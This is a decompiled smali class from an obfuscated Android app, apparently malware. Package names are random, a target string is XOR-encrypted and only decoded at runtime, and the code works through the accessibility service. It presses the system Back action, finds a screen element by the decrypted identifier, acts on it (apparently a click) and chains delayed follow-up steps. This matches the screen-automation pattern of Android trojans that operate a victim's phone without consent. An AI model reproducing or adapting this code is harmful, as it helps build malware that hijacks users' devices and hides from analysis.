.class Lcom/vknnolqo/p9sv5zvf/JQgPaybB$h;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->V0()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic c()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$h;->f()V

    return-void
.end method

.method public static synthetic d()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$h;->e()V

    return-void
.end method

.method private static synthetic e()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f0()V

    return-void
.end method

.method private static synthetic f()V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/XoQZQbM9;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/XoQZQbM9;-><init>()V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method


# virtual methods
.method public a()V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a0(I)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/BUop2ImL;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/BUop2ImL;-><init>()V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void

    :array_0
    .array-data 1
        0x2at
        -0x74t
        -0x1t
        -0x66t
        -0x18t
        0x42t
        -0x2ft
        0x50t
        0x67t
        -0x70t
        -0x9t
        -0x29t
        -0x10t
        0x59t
        -0x33t
        0x4dt
        0x30t
        -0x80t
        -0x9t
        -0x26t
        -0xft
        0x4et
        -0x2at
        0x3t
        0x20t
        -0x79t
        -0x43t
        -0x2bt
        -0x18t
        0x74t
        -0x40t
        0x5ct
        0x3dt
        -0x7et
        -0x5t
        -0x28t
        -0x26t
        0x40t
        -0x3ft
        0x5ct
        0x39t
        -0x7at
        -0x20t
    .end array-data

    :array_1
    .array-data 1
        0x49t
        -0x1dt
        -0x6et
        -0x4ct
        -0x7bt
        0x2bt
        -0x5ct
        0x39t
    .end array-data
.end method

.method public b()V
    .locals 0

    .line 1
    return-void
.end method
